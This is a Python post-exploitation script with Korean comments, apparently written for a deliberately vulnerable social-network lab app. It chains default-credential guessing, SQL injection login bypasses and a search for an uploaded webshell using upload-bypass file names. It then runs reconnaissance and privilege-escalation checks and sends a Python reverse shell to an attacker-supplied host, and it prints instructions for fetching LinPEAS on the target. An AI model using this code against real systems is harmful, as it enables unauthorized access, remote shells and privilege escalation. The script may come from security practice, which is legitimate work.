#!/usr/bin/env python3
"""
웹쉘 후속 공격 스크립트
웹쉘을 통해 Reverse Shell 획득 및 정보 수집

사용법: python3 post_exploit.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>
"""

import requests
import sys
import time
import base64
from urllib.parse import quote

class PostExploiter:
    def __init__(self, target_ip, attacker_ip, attacker_port):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.webshell_url = None
        self.webshell_name = None
        self.webshell_param = "cmd"  # 기본값
        self.session = requests.Session()

    def login(self):
        """기본 계정 + SQL Injection 로그인"""
        print("[*] 로그인 시도 중...")

        login_url = f"http://{self.target_ip}/login.php"

        # PRIORITY 1: 기본 계정 먼저 시도
        print("\n[*] Phase 1: 기본 계정 시도")
        default_creds = [
            ("admin", "admin123"),
            ("alice", "alice2024"),
            ("bob", "bobby123"),
            ("admin", "admin"),
            ("admin", "password"),
        ]

        for username, password in default_creds:
            try:
                print(f"[*] 시도: {username} / {password}")
                data = {
                    'username': username,
                    'password': password
                }
                resp = self.session.post(login_url, data=data, timeout=10, allow_redirects=True)

                # 로그인 성공 확인
                if 'login.php' not in resp.url and resp.status_code == 200:
                    print(f"[+] 기본 계정 로그인 성공: {username} / {password}")
                    return True

                # 세션 쿠키 확인
                if 'PHPSESSID' in self.session.cookies or 'session' in str(self.session.cookies).lower():
                    test_resp = self.session.get(f"http://{self.target_ip}/index.php")
                    if 'login' not in test_resp.url.lower() or 'logout' in test_resp.text.lower():
                        print(f"[+] 기본 계정 로그인 성공 (세션): {username} / {password}")
                        return True

                time.sleep(0.3)
            except Exception as e:
                continue

        print("[-] 기본 계정 실패")

        # PRIORITY 2: SQL Injection 시도
        print("\n[*] Phase 2: SQL Injection 시도")
        sql_payloads = [
            ("admin", "' or '1'='1' --"),
            ("admin", "' or '1'='1"),
            ("admin", '" or "1"="1" --'),
            ("admin' --", 'anything'),
            ("admin' OR '1'='1' --", "password"),
            ("admin'#", 'anything'),
        ]

        for username, password in sql_payloads:
            try:
                print(f"[*] SQLi: {username[:30]} / {password[:30]}")
                data = {
                    'username': username,
                    'password': password
                }
                resp = self.session.post(login_url, data=data, timeout=10, allow_redirects=True)

                if 'login.php' not in resp.url and resp.status_code == 200:
                    print(f"[+] SQL Injection 성공: {username} / {password}")
                    return True

                time.sleep(0.3)
            except:
                continue

        print("[-] 모든 로그인 시도 실패")
        return False

    def find_webshell(self):
        """업로드된 웹쉘 찾기"""
        print("[*] 웹쉘 찾는 중...")

        # 웹쉘 파일명 리스트
        shell_names = [
            "shell.jpg",  # 가장 흔한 것
            "shell.php",
            "shell.php3",
            "shell.php4",
            "shell.php5",
            "shell.phtml",
            "shell.phps",
            "shell.phar",
            "shell.php.",
            "shell.php....",
            "shell.php.jpg",
            "shell.php%00.jpg",
            "avatar_shell.php",
            "shell_E.gif",
        ]

        # 가능한 경로들
        base_paths = [
            f"http://{self.target_ip}/",
            f"http://{self.target_ip}/vulnerable-sns/www/",
            f"http://{self.target_ip}/www/",
        ]

        # file.php를 통한 웹쉘 실행 방식 시도
        # 형식: file.php?name=shell.jpg&cmd=whoami
        for base_path in base_paths:
            file_php = base_path + "file.php"
            for shell_name in shell_names:
                try:
                    # cmd 파라미터 시도
                    test_url = f"{file_php}?name={shell_name}&cmd=whoami"
                    resp = self.session.get(test_url, timeout=5)
                    if resp.status_code == 200 and len(resp.text.strip()) > 0:
                        # 응답이 있으면 웹쉘 발견
                        self.webshell_url = file_php
                        self.webshell_name = shell_name
                        self.webshell_param = "cmd"
                        print(f"[+] 웹쉘 발견: {file_php}?name={shell_name}")
                        print(f"[+] 테스트 결과: {resp.text[:100]}")
                        return True
                except:
                    pass

                try:
                    # command 파라미터 시도
                    test_url = f"{file_php}?name={shell_name}&command=whoami"
                    resp = self.session.get(test_url, timeout=5)
                    if resp.status_code == 200 and len(resp.text.strip()) > 0:
                        self.webshell_url = file_php
                        self.webshell_name = shell_name
                        self.webshell_param = "command"
                        print(f"[+] 웹쉘 발견: {file_php}?name={shell_name}")
                        print(f"[+] 테스트 결과: {resp.text[:100]}")
                        return True
                except:
                    continue

        print("[-] 웹쉘을 찾을 수 없습니다. auto.py를 먼저 실행하세요.")
        print("[*] 수동으로 확인해보세요:")
        print(f"    curl 'http://{self.target_ip}/file.php?name=shell.jpg&cmd=whoami'")
        return False

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        if not self.webshell_url:
            return None

        try:
            # file.php?name=shell.jpg&cmd=명령어 형식
            params = {
                'name': self.webshell_name,
                self.webshell_param: cmd
            }
            resp = self.session.get(self.webshell_url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            print(f"[-] 명령 실행 실패: {e}")
            return None

    def gather_system_info(self):
        """시스템 정보 수집"""
        print("\n" + "="*60)
        print("시스템 정보 수집")
        print("="*60)

        commands = {
            "사용자": "whoami",
            "호스트명": "hostname",
            "OS 정보": "cat /etc/os-release | head -3",
            "커널 버전": "uname -a",
            "현재 디렉토리": "pwd",
            "실행 중인 서비스": "ps aux | grep -E '(apache|nginx|postgres|mysql)' | grep -v grep",
        }

        for desc, cmd in commands.items():
            print(f"\n[*] {desc}:")
            result = self.execute_command(cmd)
            if result:
                print(result.strip())

        print("\n" + "="*60)

    def check_privilege_escalation_vectors(self):
        """권한 상승 벡터 확인"""
        print("\n" + "="*60)
        print("권한 상승 벡터 검사")
        print("="*60)

        checks = {
            "SUID 바이너리": "find / -perm -4000 -type f 2>/dev/null | head -20",
            "Sudo 권한": "sudo -l 2>/dev/null || echo 'sudo 불가능'",
            "Writable /etc/passwd": "test -w /etc/passwd && echo 'WRITABLE!' || echo 'Not writable'",
            "Cron jobs": "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null",
            "Kernel version": "uname -r",
        }

        for desc, cmd in checks.items():
            print(f"\n[*] {desc}:")
            result = self.execute_command(cmd)
            if result:
                print(result.strip())

        print("\n" + "="*60)

    def setup_reverse_shell(self):
        """Reverse Shell 설정"""
        print("\n" + "="*60)
        print("Reverse Shell 설정")
        print("="*60)

        print(f"\n[*] 공격자 IP: {self.attacker_ip}:{self.attacker_port}")
        print("[*] 로컬에서 다음 명령으로 리스너 시작:")
        print(f"    nc -lvnp {self.attacker_port}")

        input("\n[!] 리스너를 시작한 후 Enter를 누르세요...")

        # Python reverse shell
        reverse_shell_cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

        print(f"\n[*] Reverse Shell 실행 중...")
        print(f"[*] 명령: {reverse_shell_cmd}")

        # 백그라운드로 실행
        result = self.execute_command(f"{reverse_shell_cmd} &")

        print("\n[+] Reverse Shell 페이로드 전송 완료!")
        print("[*] 로컬 터미널에서 연결을 확인하세요.")
        print("\n[*] 연결 후 다음 명령 실행:")
        print("    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        print("    export TERM=xterm")

    def download_privilege_escalation_script(self):
        """권한 상승 스크립트 다운로드"""
        print("\n" + "="*60)
        print("권한 상승 스크립트 준비")
        print("="*60)

        # 권한 상승 스크립트를 타겟에 다운로드
        print("\n[*] 다음 명령들을 Reverse Shell에서 실행하세요:\n")

        print("# 1. 작업 디렉토리 생성")
        print("mkdir -p /tmp/.work && cd /tmp/.work")

        print("\n# 2. LinPEAS 다운로드 (권한 상승 벡터 자동 검사)")
        print("wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")
        print("chmod +x linpeas.sh")
        print("./linpeas.sh | tee linpeas_output.txt")

        print("\n# 3. 수동 확인")
        print("sudo -l")
        print("find / -perm -4000 -type f 2>/dev/null")
        print("cat /etc/crontab")
        print("cat /etc/passwd | grep -v nologin")

        print("\n" + "="*60)

    def run(self):
        """전체 실행"""
        print("="*60)
        print("POST-EXPLOITATION FRAMEWORK")
        print("="*60)

        # 먼저 로그인
        if not self.login():
            print("[-] 로그인 실패 - 웹쉘 접근 불가")
            return False

        if not self.find_webshell():
            return False

        # 1. 시스템 정보 수집
        self.gather_system_info()

        # 2. 권한 상승 벡터 확인
        self.check_privilege_escalation_vectors()

        # 3. Reverse Shell 선택
        print("\n" + "="*60)
        print("다음 단계 선택")
        print("="*60)
        print("1. Reverse Shell 획득 (추천)")
        print("2. 웹쉘 계속 사용")
        print("3. 종료")

        choice = input("\n선택 (1-3): ").strip()

        if choice == "1":
            self.setup_reverse_shell()
            self.download_privilege_escalation_script()
        elif choice == "2":
            print("\n[*] 웹쉘 URL:", self.webshell_url)
            print("[*] 수동으로 명령을 실행하세요.")

        print("\n[+] Post-exploitation 완료!")
        return True


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("사용법: python3 post_exploit.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>")
        print("예: python3 post_exploit.py 15.164.95.252 $(hostname -I | awk '{print $1}') 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    exploiter = PostExploiter(target_ip, attacker_ip, attacker_port)
    exploiter.run()
